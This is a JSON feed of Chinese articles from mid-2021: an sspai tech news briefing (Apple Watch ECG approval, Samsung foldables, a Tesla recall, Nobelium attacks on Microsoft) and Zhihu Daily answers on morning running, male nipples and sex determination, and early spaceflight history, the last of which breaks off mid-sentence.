[{"title":"派早报：Apple Watch 心电图功能在大陆获批、三星折叠屏手机新品参数曝光等","date":"2021-06-28 00:53:09","description":"\n<h2>Apple Watch 心电图功能在大陆获得批准</h2>\n<p>6 月 25 日，根据国家药品监督管理局政务服务门户信息显示，在最新的医疗器械批准证明文件待领取名单中，来自 Apple 申请的移动心电图房颤提示软件已于 6 月 21 日获得批准。<a href=\"https://www.nmpa.gov.cn/zwfw/sdxx/sdxxylqx/qxpjfb/20210625161714150.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/df0daa622dbbab9ecb6fedc545ad80f7.png\"></figure><h2>三星折叠屏手机新品参数曝光</h2>\n<p>近日，三星旗下折叠屏手机新品 Galaxy Z Fold 3、Galaxy Z Flip 3 参数继续获得曝光。其中，Galaxy Z Fold 3 外屏尺寸 6.23 英寸，内屏尺寸 7.55 英寸，或将继续搭载 2208×1768 分辨率 AMOLED 屏，支持 120Hz 刷新率。Galaxy Z Fold 3 已获美国 FCC 认证，将配备手写笔，搭载高通骁龙 888 处理器。</p>\n<p>Galaxy Z Flip 3 将采用上下折叠结构，内屏尺寸 6.7 英寸，摄像头旁边副屏尺寸 1.9 英寸，可能支持 120Hz 刷新率。<a href=\"https://www.phonearena.com/news/samsung-galaxy-z-fold-3-z-flip-3-display-specs-revealed_id133140\" target=\"_blank\">来源</a></p>\n<h2>iPad 或将研发屏幕尺寸更大的产品</h2>\n<p>据彭博社的 Mark Gurman 报道，Apple 或在探索屏幕尺寸更大的 iPad 产品。据称，目前 Apple 将注意力集中在如何对现有尺寸的 iPad 进行重新设计，可能会在 2022 年推出相关产品；对于更大尺寸的 iPad 产品，至少需要几年时间才会推向市场，并将进一步模糊平板电脑和笔记本产品之间的界限。<a href=\"https://www.macrumors.com/2021/06/27/apple-exploring-larger-ipads/\" target=\"_blank\">来源</a></p>\n<h2>特斯拉中国召回部分 Model 3 和 Model Y 车辆</h2>\n<p>6 月 26 日，特斯拉客户支持发布微博头条文章，明确开始针对部分 Model 3 和 Model Y 车辆进行召回。因为主动巡航控制功能可能被驾驶员误激活，在极端情况下存在安全隐患。用户无需到店即可通过汽车远程升级（OTA）完成召回，本次 OTA 提高了激活主动巡航的阈值，加入了主动巡航功能激活和退出的提醒。<a href=\"https://weibo.com/ttarticle/p/show?id=2309404652314064715979#_0\" target=\"_blank\">来源</a></p>\n<h2>vivo 申请 NEX FOLD 、NEX ROLL 等商标</h2>\n<p>近日，vivo 申请了「NEX FOLD」「NEX SLIDE」「NEX ROLL」等多个商标，国际分类为 9 类科学仪器，目前商标状态均为注册申请中；从名称上不难看出，vivo 或将推出折叠屏、卷轴或是滑屏手机。此前，vivo 曾经申请可折叠手机专利，机身外形类似 Galaxy Z Fold，摄像头模组位置有所不同，并配备了手写笔。<a href=\"https://www.gsmarena.com/vivo_trademarks_names_for_rollable_slideable_and_foldable_nex_phones-news-49763.php\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/article/7e883f17bfd20e2eeb4287e10becbfaf\" alt=\"vivo trademarks names for rollable, slideable and foldable NEX phones\"></figure><h2>微软遭受黑客组织攻击</h2>\n<p>针对近期 Nobelium 组织进行的大范围网络攻击，微软安全响应中心在其最新博客中公布了最新的调查情况。目前 Nobelium 主要攻击手段包括密码穷举以及 DDos 攻击，但大多数的攻击并未成功，而受到攻击的主要是 IT 公司、政府网站以及其他行业客户。微软提示用户开启安全预防措施，包括开启二次验证、设置低访问权限等。<a href=\"https://msrc-blog.microsoft.com/2021/06/25/new-nobelium-activity/\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/67413\" target=\"_blank\">Windows 11 要更新了，这些变化能让你心动吗？</a></li>\n<li><a href=\"https://sspai.com/post/67012\" target=\"_blank\">独居如何享受烹饪乐趣：我的厨房搭建经验分享</a></li>\n<li><a href=\"https://sspai.com/post/67317\" target=\"_blank\">钉住那只「咸猪手」：写给非专业人士的狭小空间迷惑行为防范指南</a></li>\n<li><a href=\"https://sspai.com/post/67433\" target=\"_blank\">2021 年，这些手机修图工具帮你留住更多美好瞬间</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67447"},{"title":"那些早上起来做饭、跑步、冲澡后去上班的人都是几点起床、几点上班的？","date":"2021-06-27 23:07:11","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-a19cbcedc9a8ca57f91f6e1f90346f46_l.jpg?source=8673f162\"><span>ASICS亚瑟士，</span><span>Sound Mind, Sound Body</span>\n<a href=\"https://www.zhihu.com/question/31097469/answer/1955505991\" hidden>阅读原文</a>\n</div>\n<div>\n<p>朝九晚五的上班族，能坚持晨跑、且不影响生活工作，几乎个个都是“时间管理大师”。他们确实有非常令人羡慕的自律能力和毅力。</p>\n<p>想把跑步安排在工作日的早晨——</p>\n<ul>\n<li>如何规划合理的工作日晨跑</li>\n<li>工作日晨跑常见的错误</li>\n<li>让晨跑更加「省时」的小贴士</li>\n</ul>\n<figure><img src=\"https://pic2.zhimg.com/v2-68567ed48fc6eea1a609037d2df1d1da_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><br><br>如何规划合理的工作日晨跑</strong></p>\n<p>不管跑步的目的是什么，最适合工作日晨跑，都是低强度有氧慢跑 / 恢复跑。</p>\n<p>跑步的时间因人而异，从 15-60 分钟不等——虽然有氧慢跑是个相对讲究运动时长的跑步类别，即便是以提升马拉松成绩为目标的系统训练中，30-40 分钟的慢跑对有氧能力的巩固和提升依然是有帮助的。而对以健身锻炼和减脂为目标的人来说，20-30 分钟的有氧跑依然是很值得推崇的「日常项目」。</p>\n<p>运动前后的热身是必不可少的环节，哪怕只是强度很低的有氧慢跑。工作日的晨跑，热身可选择两种形式：</p>\n<ul>\n<li>在慢跑 3-10 分钟后，进行简单的放松和拉伸，而后开始匀速的慢跑；</li>\n<li>将开始的 3-10 分钟作为热身，在这个时段内让心率逐步从静息提升至有氧心率区间，而后维持。</li>\n</ul>\n<p>如果住在高层，也可选择楼梯、而非电梯下楼，来作为身体肌肉关节和心肺的初步“唤醒”。</p>\n<p>完成慢跑后，同样需要安排 3-10 分钟的冷身，逐渐让身体回到放松状态，并进行静态拉伸（3-5 个动作，每个动作持续 15-30 秒，循环 2-3 次）。</p>\n<p>晨跑强度需要的完整拉伸动作一般在 5-10 分钟时间。</p>\n<p>——这样算下来，一次完整且合理的工作日晨跑，需要 25-70 分钟不等。</p>\n<p>具体时长、距离和强度因人而异，但其中的热身、有氧慢跑、冷身 / 拉伸等关键词，都不可忽略。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-de8c2c23973db2509f1308e5faf66847_720w.jpg?source=8673f162\" alt=\"\"></figure><p>以有氧慢跑为强度的晨跑，并不需要在运动前的饮食中，对能量摄入有过高的要求。不过迄今很多关于晨跑的困扰里，依然常见低血糖、过饱、运动时肠胃不适……等问题。</p>\n<p>晨跑前饮食的几个要点，</p>\n<ul>\n<li>无论运动强度如何，都要避免空腹进行。一片面包 + 一根香蕉，一小块巧克力或者一个苹果，一杯燕麦等，都是不错的运动前食物；</li>\n<li>很多人的早餐里会有糯米类食品，并不容易消化，吃后运动对肠胃会是一种负担。另外跑步也会加速肠胃的蠕动，有不少跑者深有体会，当摄入过量 / 消化完成，跑步中时常会产生便意；</li>\n<li>油条、豆浆、麻球等食物往往富含油脂，同样不适合运动前早餐。难以割舍的话，不妨将它们放在运动后再吃；</li>\n<li>起床后至出门跑步前，可小口多次饮水，单次 50-150ml 为宜（出门前可上一次厕所）；</li>\n</ul>\n<p>所有的运动饮食前提，个人的适应性都是放在第一位的，其次才是逐渐调整改变。</p>\n<p>因而，很多运动健康类媒体可能会燕麦片、牛奶等放入推荐，你依然要根据自己的饮食习惯稍作调整。</p>\n<p>早餐的重要性不言而喻，也可将早餐的量一分为二、在跑步前后分开摄入。这样即不会给肠胃过多负担、减少运动前消化的时间，也能作为运动后的适当补给。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c94e5de4daaacda623e8b13731c4766c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>以 9 点钟开始工作、40 分钟上班通勤时间的人为例：</p>\n<ul><li>6 点整</li></ul>\n<p>起床</p>\n<ul><li>6 点整 -6 点 25</li></ul>\n<p>完成洗漱及简单早餐，穿好跑步装备出门跑步</p>\n<ul><li>6 点 30-7 点 15</li></ul>\n<p>进行 30-45 分钟的有氧慢跑</p>\n<ul><li>7 点 15 分 -7 点 30 分</li></ul>\n<p>结束跑步，进行冷身 / 拉伸 / 放松，回到家中</p>\n<ul><li>7 点 30-8 点整</li></ul>\n<p>跑步后沐浴换装，收拾整理准备出门。可适当再补充饮食。</p>\n<ul>\n<li>8 点 10 分出门</li>\n<li>8 点 50 抵达公司</li>\n</ul>\n<p>可根据自己情况灵活调整。请勿省去早餐后稍事休息、跑完后的拉伸等环节。</p>\n<p><strong><br>工作日晨跑常见的错误</strong><strong>晨跑的奥义在于坚持</strong></p>\n<p>一个很现实的问题，你是否真的做好早起晨跑的准备，并将它作为长期的习惯？</p>\n<p>跑步之所以被推崇，除了入门门槛较低之外，长期坚持跑步也会带来诸多益处。不过「坚持」都是第一前提。如果你只能偶尔晨跑、需要极大勇气才能在工作日更早起床、也实在反感晨跑需要的大量事项——不如将跑步时间调整到晚上。</p>\n<p>早上跑步与晚上跑步的差异微乎其微，对上班族而言可行性区别却极高。所以如果无法坚持晨跑，与其强求，还是改变运动的时间吧。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b346db1f30c94885e3f9ce6f55dc837c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>关于晨跑 or 夜跑，这些回答会给你参考：</p>\n<p><a href=\"https://www.zhihu.com/question/332642650/answer/1233036291\">晚上跑步和早上跑步有区别吗？</a></p>\n<p><a href=\"https://www.zhihu.com/question/48070366/answer/1474472749\">刚开始跑步要天天跑还是隔天？</a></p>\n<p><a href=\"https://www.zhihu.com/question/27711735/answer/1462960992\">运动完后立刻洗澡好不好？</a></p>\n<p><a href=\"https://www.zhihu.com/question/30940799/answer/1224734363\">晚上跑步会被月亮晒黑吗？</a></p>\n<p><strong><br>在工作日晨跑进行高强度的训练</strong></p>\n<p>高强度训练包括乳酸门槛跑、间歇跑等。相比有氧慢跑，强度训练往往单次训练的时间和距离都更短。不过这种看似“耗时更短”的训练并不适合放在工作日早晨。</p>\n<p>最主要的理由是，强度训练会让身体在结束训练后较长时间依然处于过量氧耗（EPOC，Excess Post-exercise Oxygen Consumption）的状态——有减脂需求的人，这是一个很迷人的状态，意味着运动后身体依然处于较高耗能的状态，可以继续享受燃脂的福利——然而这也会让身体处于相对疲惫的状态，也会影响精力的集中，很难很快投入到工作状态。</p>\n<p>且强度训练后，往往会建议安排更长时间的慢跑恢复和拉伸放松，以缓解肌肉和关节的压力。这在时间捉急的早晨又会很容易被忽略。</p>\n<p> </p>\n<p><strong>最适合工作日的跑步，依然是有氧慢跑和恢复跑</strong></p>\n<p>对健身为目的的跑者，有氧慢跑会是对高压工作中，身心的极大放松；</p>\n<p>对严肃跑步训练者，有氧慢跑会在所有跑步中占到 70%甚至更高的比例，工作日的慢跑是很好的补充跑量、恢复身体、为后续训练做准备的方式。</p>\n<p>另外，可以在有氧慢跑后安排 5-10 组的跨步快跑，以 70-100 米的稍快速度跑步，再以 30-50 米降速。这样既不会给身体额外有压力，又能提升身体 / 肌肉兴奋度，也更好的刺激腿部快肌。</p>\n<p><strong>尽量选择环家附近的形路面进行、且单圈距离最好不超过 3 公里</strong></p>\n<p>这意味着，一旦有突发情况需要返回，只需至多 5-10 分钟时间。晨跑相比夜跑留给跑者的冗余时间并不多。</p>\n<p>相同一条马路，早与晚呈现的路况和拥挤程度往往是截然不同的。这也要纳入晨跑 / 夜跑的考虑范围内。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-42660b09819dd5c0d430db19f294bb8c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>晨跑应尽量避开早高峰行人 / 行车较多的路段，也谨慎使用隔音 / 降噪耳塞以防止交通意外</figcaption></figure><p><strong><br>关注天气中的湿度及体感温度</strong></p>\n<p>春秋季节昼夜温差极大，清晨时气温可能很低，也不该只看温度，湿度和体感温度是更有参考价值的数值。</p>\n<p>越是高湿度，尤其注意装备的排汗性，运动前中后也要补充更多水分。高湿度意味着可能在清晨会有更多雾气 / 露水，留意路面的湿滑情况；</p>\n<p>体感温度则能更直接的决定你的穿衣。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-731805d57a026936fb9aa44a3e9871a6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>即便阳光并不强烈，对跑者尤其是女性跑者而言，晨跑的防晒依然是很有必要重视的部分。皮肤类粉尘过敏 / 防晒等情况，也是跑步伤病中最被忽略的潜在问题</figcaption></figure><p><strong><br>除了天气，以身体状况作为晨跑考量</strong></p>\n<p>很多人会测量晨脉 / 静息心率，来作为身体疲惫程度的依据。理论上也可将晨脉等同于静息心率作为测算。晨脉的测量，可在睡醒后坐床边 1-3 分钟，而后测量（用心率表 / 按压脉搏计算都可）。</p>\n<p>运动之外，晨脉 / 静息心率的最大意义在于每天的比较——如今天晨脉较此前高了 10%，可能意味着昨天的工作、运动强度较高，或睡眠休息不足，身体较为疲惫，此时就应该调整降低今天的晨跑强度，或者选择继续休息会。</p>\n<p>用于跑步测算的静息心率，更为精准的方式是身体放松状态下，站立姿态测量。</p>\n<p><strong><br>如何尽可能让晨跑更加「省时」？</strong></p>\n<p>第二天跑步需要的一切，跑步装备、跑前饮食、跑步补水、淋浴准备……全部在当晚准备齐全。</p>\n<p>几个小诀窍：</p>\n<p>如果自己动手做早饭，可在前晚将食材准备好。跑步前的饮食一般相对简单，起床后洗漱间隙，微波炉「叮」一下即可；</p>\n<p>睡前看一眼天气预报，将适合的跑步服装准备好。也再次确定第二天是否会有雨水 / 是否适合跑步；</p>\n<p>对于容易遗忘的小物件，如钥匙、耳机、门卡等，可提前在跑步腰包、跑步服装中放好——一句话，所有晨跑会用到的装备，第二天需要做的只是穿戴上它们；</p>\n<p>同样的，工作用品也尽量在前一晚就整理妥当。这样跑步后淋浴 - 换装 - 出门，就不会有额外耽误时间的小插曲了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f87c6044eca81f1008b73cc507d5212c_720w.jpg?source=8673f162\" alt=\"\"></figure><hr>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/31097469\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737444"},{"title":"男生的胸部有什么作用？","date":"2021-06-27 23:07:04","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-8a45ca7a44be6f2ecf03d132046ab011_l.jpg?source=8673f162\"><span>混乱博物馆，</span><span>一档满足百科知识好奇心的短视频节目，都是些你不知道的。</span>\n<a href=\"https://www.zhihu.com/question/266991701/answer/915406437\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>让男人拥有乳头，是我们进化上的策略。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6ccbb4560cd377725c4644aa0d15ae8e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个问题最直接的答案是，人类拥有以 Y 染色体为中心的性别决定机制：我们都知道人有两条性染色体，女性带有两条 X 染色体，男性带有一条 X 染色体和一条 Y 染色体。经过减数分裂和受精作用，分别来自双亲的两条性染色体也将继续决定胎儿的性别。</p>\n<p>但是我们要明白，染色体本身说明不了什么问题，关键在于它们携带着的基因——Y 染色体的短臂上有一个 SRY 基因，就是我们唯一的性别决定基因，只要表达了这个基因，胚胎就会发育成雄性，否则就会发育成雌性。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-41409dc8285b82ba1aef5e488ad0c50e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>但是这个基因要到胚胎发育的第 6 到 8 周才从性腺开始逐渐表达，胚胎早已按照雌性的构造发育出了乳头和乳腺，再也无法撤销了。所以不妨说，在哺乳动物的 XY 性别决定机制里，雌性是默认性别，而 SRY 基因的功能就是将一部分雌性胚胎逆转成雄性。</p>\n<p>因此不难想象，由于相同的性别决定机制，所有后兽亚纲的雄性哺乳动物实际上都有乳头和乳腺。</p>\n<p>但是在其它动物身上，我们就会发现五花八门各式各样的性别决定机制。比如鸟类就与我们刚好相反，雄性有两条 Z 染色体，雌性有一条 Z 染色体和一条 W 染色体，那条 W 染色体上携带着决定雌性的 DMRT1 基因，所以鸟类的默认性别就是雄性。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-34b44ad4efb25288fb596a670795b72a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>而鸭嘴兽有着介于两者之间的性别决定机制，它们有 10 条性染色体，其中雌性有 5 对 X 染色体，雄性有 5 条 X 染色体和 5 条 Y 染色体，但其中的某些 X 染色体与鸟类的 W 染色体关系很近，这给我们重建进化历程提供了重要线索。</p>\n<p>性染色体机制也以不同的方式出现在谱系更古老的脊椎动物身上，爬行动物更普遍地用温度决定性别，它们在某个温度范围之内孵出雄性，其余就都是雌性，只有蛇完全采 ZW 性染色体机制，这是一条性别分化越来越精确的进化之路。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4c47693db2774e63b66e96316a4ee91f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>如果说鸭嘴兽和爬行动物揭示了性染色体的过去，节肢动物就可能暗示了性染色体的未来。比如大部分昆虫都有 XY 性染色体，果蝇是其中研究最充分的。但我们发现果蝇没有专门的性别基因，而是用 X 染色体相对于常染色体的倍数决定性别，1 倍就是雌性，1 半就是雄性，而 Y 染色体浓缩失活，没什么作用。甚至某些果蝇干脆就没有 Y 染色体，雌性有两条 X 染色体，雄性有一条 X 染色体，称为 X0 染色体机制——这在其它昆虫身上更加普遍，比如蜻蜓、蝗虫、螳螂、白蚁。</p>\n<p>我们对此有一个浅显的推测：有性生殖的一大意义，就是在减数分裂的联会过程中，同源染色体可以交换一部分片段，这提供了修复有害突变的宝贵机会。但是在 XY 染色体之中，那条 Y 染色体与 X 染色体差异太大，失去了这样的修复机会，因此在世代积累中变得脆弱，最终完全丢失了，它的功能则由其它染色体或者其它机制接替。</p>\n<p>由于昆虫繁殖更快，所以先我们一步实现了 X0 机制，某些繁殖迅速的啮齿动物也已经达到这种境地，比如琉球特产的几种裔属就已经没有了 Y 染色体——或许经过漫长的岁月，其它哺乳动物也会达到这一步吧。</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1183771566092996608\" target=\"_blank\"><img src=\"https://pic4.zhimg.com/v2-0059c48338f9f999daf6c615bce54117.jpg\" alt=\"\"><span><span></span></span></a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/266991701\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737496"},{"title":"人类航天史是怎么开始的？","date":"2021-06-27 23:06:57","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-60f9814e72da1f2a51905cfa746b4acc_l.jpg?source=8673f162\"><span>作者无敌AA，</span><span>KSP官方简中志愿者，ACGNV，IT也行，航空航天相关杂学</span>\n<a href=\"https://www.zhihu.com/question/265624068/answer/302470804\" hidden>阅读原文</a>\n</div>\n<div>\n<p>谢邀。</p>\n<p>航天史是怎么开始的！这个问题问得好，我们得倒转一下时间，去拜访三位伟大的先人。</p>\n<p>以下解答基于真正的“航天”概念出现，也就是在短时间内不再需要落回地面的情况，不包括连来源都很可疑的万户飞天这样的故事。部分引用资料来自 Wikipedia。</p>\n<ul><li><strong>牛顿的地球大炮</strong></li></ul>\n<p>说到第一个阐述扔出去的物体能不落回地面或者落到什么地方的人，那当然就是我们著名的<strong>艾萨克·牛顿</strong>爵士了。谁如果不认识下面这个人请自行去百度或者去翻初中物理书。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-450151d59704e3711c48faa38246beeb_720w.jpg?source=8673f162\" alt=\"\"></figure><p>虽然在此之前就有不少人阐述过天体的运动，但是牛顿是第一个用引力的观点去解释它们的人——当然了万有引力这玩意都是这位先生因为看到苹果落地发现的，之前哪里还来的先人呢。</p>\n<p>牛顿在 1686 年写成了足以让他名垂青史的《<strong>自然哲学的数学原理</strong>》一书，在书中的第三卷“论宇宙的系统”（英语：On the system of the world），他提出了这样的一个思想实验：</p>\n<blockquote>设想有一门加农炮架在一座非常高的山的山顶上。如果在没有任何引力和空气阻力条件下，炮弹应该沿着发射的方向以一条直线的轨迹远离地球。如果有一个吸引力存在的话，炮弹会沿着一条不同的轨道运动，轨道的形状取决于炮弹的初始速度。如果速度低的话，炮弹就会直接掉在地球上。如下图所示的运行轨迹的初始水平速度分别在 0 到 7000 米 / 秒之间。</blockquote>\n<figure><img src=\"https://pic4.zhimg.com/v2-6387dd24ed773933a98b7e675735608f_720w.gif?source=8673f162\" alt=\"\"><figcaption>0m/s 初速度</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-676b4d2aff27441aaf26426d4cb0e9c5_720w.gif?source=8673f162\" alt=\"\"><figcaption>6000m/s 初速度</figcaption></figure><blockquote>如果速度达到了所在海拔的第一宇宙速度，即约 7300 米 / 秒，炮弹将会沿着一个固定的环形轨道环绕地球，就像月球一样。（图片过大无法上传，下同）<br>如果速度大于轨道速度，但小于第二宇宙速度的话，炮弹会沿着一个椭圆轨道环绕地球。如果速度非常快，炮弹将会沿着一个抛物线（当速度恰好为第二宇宙速度）或者双曲线（当速度大于第二宇宙速度）轨道逃离地球。</blockquote>\n<figure><img src=\"https://pic2.zhimg.com/v2-223ec4a141ba277e8428b2b274c8cf88_720w.jpg?source=8673f162\" alt=\"\"><figcaption>牛顿大炮的各种情况</figcaption></figure><p>这一思想实验，就是最早的关于人造卫星的科学设想，也能算是航天史的正式起点。有了科学的理论，人们开始在各种奇思妙想中实现牛顿的大炮，比如儒勒·凡尔纳的《从地球到月球》一书中就提到了，从佛罗里达州的一门巨炮中发射的炮弹，带着三个人抵达了月球。</p>\n<p>不知道是巧合还是刻意的安排，几十年之后，当佛罗里达州卡纳维拉尔角成为 NASA 的主要发射场，人们才会惊叹这惊人的巧合。但是大炮发射瞬间的巨大过载绝非人所能承受的，用大炮到达月球也显然并不现实，于是我们需要一个更现实的解决方案。</p>\n<ul><li><strong>齐奥尔科夫斯基的球形飞船</strong></li></ul>\n<p><strong>康斯坦丁·埃杜阿尔多维奇·齐奥尔科夫斯基</strong>，这位名字很长的俄罗斯教师，成为了迈出关键一步的那个人。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-5a2b21c24727705b43beddb85c5cd8a4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>从小因病休学，没有受过高等教育，一直到 16 岁都全靠自学的他，凭着在莫斯科图书馆磨出来的知识底子，成为了一名中学数学教师。如果就这样也就罢了，但是凭着自己巨大的知识储备量，齐奥尔科夫斯基在教书的过程中开始对自然科学产生兴趣，尤其是气体和反作用力方面的理论。</p>\n<p>1880 年，23 岁的他开始写自己的第一篇研究论文《气体的理论》，论述了适用于气体的动能定理，然而在投稿给俄罗斯物理化学学会后，他被告知这些理论早在 25 年前就被发现了。这个人的思路也十分神奇，他改学了生物学，重写了一篇关于动物生理学理论的论文投稿，这一次大受好评，他才得以加入学会。笔者以为，齐奥尔科夫斯基要是就此改弦更张，可能我们现在提到他的头衔就是俄国著名生物学家了，当然他最后并没有。</p>\n<p>那这个人既然没有改学生物而是继续研究他的爱好，那他之后干了什么牛逼的事情呢？</p>\n<p>1892 年，他调了一个稍微闲一点的教学岗位，开始试图制造一艘<strong>可折叠的硬式飞艇</strong>；</p>\n<p>1894 年，他写了一篇论文《飞机或类似鸟形状的飞行器》，设想了<strong>金属骨架、带有蒙皮的固定单翼飞行器</strong>（注意是单翼），绘制了相关的概念图，并且预言其将在 15 到 18 年后被制造出来。这东西在九年多后的 1903 年 12 月 17 日，被莱特兄弟真正制造出来并一飞冲天；</p>\n<p>1897 年，他建造了俄罗斯的第一个<strong>风洞</strong>，并独立设计出了使用其进行实验的全部规程。</p>\n<p>但是这不是最大的重点，重点在于他在这期间的 1896 年，开始对<strong>火箭</strong>产生了兴趣。</p>\n<p>自从中国人在 7 世纪正式发明了火药，气体膨胀产生的反作用力能让各种各样的东西飞上天这一事实就已经广为人知。齐奥尔科夫斯基当时正好在研究飞行器，而他当时需要计算飞行器的最理想油耗情况。基于之前的各种相关研究，他于 1896 年推导出了一条被他称为“<strong>航空学方程</strong>”的公式：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cdelta+V%3Dv_%7Be%7D%5Ccdot+ln+%28%5Cfrac%7BM_%7B0%7D%7D%7BM_%7B1%7D%7D%29\" alt=\"\"></p>\n<blockquote>\n<img src=\"https://www.zhihu.com/equation?tex=%5Cdelta+V\" alt=\"\"> 被齐奥尔科夫斯基称为“速度变化量”，指的是理想状态下飞行器改变自身速度的总能力； <img src=\"https://www.zhihu.com/equation?tex=v_%7Be%7D\" alt=\"\"> 指的是飞行器向后喷出气体的速率——这个数值现在被称为“比冲量”，也可以等效为单位质量推进剂单位时间内产生的冲量； <img src=\"https://www.zhihu.com/equation?tex=M_%7B0%7D\" alt=\"\"> 和 <img src=\"https://www.zhihu.com/equation?tex=M_%7B1%7D\" alt=\"\"> 则分别是满载和空载状态下飞行器的质量。</blockquote>\n<p>学界在后来给这条方程起了一个更加响亮的名字：<strong>齐奥尔科夫斯基火箭方程</strong>。</p>\n<p>如果读者对火箭和航天足够了解，应该不难看出这等式有多么伟大。根据万有引力定律和向心力原理，火箭或者飞船的运动状况完全取决于其速度，于是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cdelta+V\" alt=\"\"></p>\n<p>也就代表了火箭改变自身轨道的能力；比冲量代表的是发动机的排气速率，是发动机效率的最直观指标之一；而最后的对数则明确地表明，除了发动机本身，火箭的能力只与其满载质量与空质量之比有关，数值越大，能力越强。<em>所以 KSP 玩家新人常有的误区之一，即推力是火箭的一切，是完全错误的，从这里看就一目了然了。</em></p>\n<p>这是现代航天真正迈出的第一步。齐奥尔科夫斯基，作为后世称为的“宇宙航行之父”，为后人铺下了通向太空的天梯（他自己也确实设想过太空电梯）的第一块铺路石。并没有能看到他的火箭，更不用说他后来提出的多级火箭，真正飞向无垠的深空。但是他把自己的梦想，全都画在了他 1929 年的著作《<strong>宇宙航行</strong>》之中：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-92ac97dcad260e677cd4bdf5a6938315_720w.jpg?source=8673f162\" alt=\"\"></figure><p>陀螺仪控制姿态，通过不同方向的发动机控制速度，宇航员利用重物的反作用力来移动。说实话笔者作为一个老 KSP 玩家和科普爱好者，当年看到老先生的这幅画大半夜热泪盈眶，一点不夸张。</p>\n<p><em>“地球是人类的摇篮，但人类不可能永远生活在摇篮中。”</em></p>\n<p>齐奥尔科夫斯基的伟大蓝图，最终将由工程师们来添砖加瓦。</p>\n<ul><li><strong>戈达德的月亮火箭</strong></li></ul>\n<p><strong>罗伯特·戈达德</strong>作为一个在当时完全典型的美国人，因为一次因缘巧合，无意间走上了和大洋彼岸的齐奥尔科夫斯基殊途同归的道路。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-68aba9c2ac3c761dc3cdc25b7424bc86_720w.jpg?source=8673f162\" alt=\"\"></figure><p>著名的科幻作家 H.G.威尔斯，在 1898 年发表了一部科幻小说，名叫《世界大战》。对这就是大家熟悉的那个世界大战，长腿火星人机甲暴打英国军队的那个。后来该书被改编成广播剧，播出的时候因为不少人听半截，没听到前面的“本故事纯属虚构”，以及音效过于逼真，还一度引起了恐慌。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-3d16d2cd2439f574481c5d7732e7c8cd_720w.jpg?source=8673f162\" alt=\"\"></figure><p>但是当时的首批读者里面，就有一个戈达德，他当时 16 岁，自此便对太空产生了浓厚的兴趣。这情节颇有些让人想起《宇宙兄弟》里，南波家两兄弟看到 UFO 之后立志成为宇航员登上月球的故事，不过那年代没有 NASA 没有 JAXA 更没有登月计划，戈达德只是从此对飞行和宇宙着了迷。</p>\n<p>他在之后的几年里作为学生，不断地给各种杂志社投稿，阐述他对于飞行器的构想——正好也是关于飞机的，结论多半基于其对飞鸟的观察。根据戈达德本人后来的回忆，自己很可能是“<strong>在人类历史上首次提出方法来‘让飞行中的航空器自动保持稳定’</strong>”的人，那篇关于飞行器平衡的论文 1907 年在《科学美国人》上刊载，当时全世界都痴迷于四年前莱特兄弟的创举，各种奇特设计、五花八门的飞机，争先恐后，蹒跚地爬向刚刚印上人类足迹的天空。</p>\n<p>1912 年，戈达德硕士毕业，进入普林斯顿大学帕尔默物理实验室，成为了一名研究员，在此期间他利用闲暇时间发明了<strong>世界上第一个真空管无线电放大器</strong>。但是天有不测风云，在此之后的 1913 年，戈达德被诊断出患有肺结核，于是被迫辞职。1914 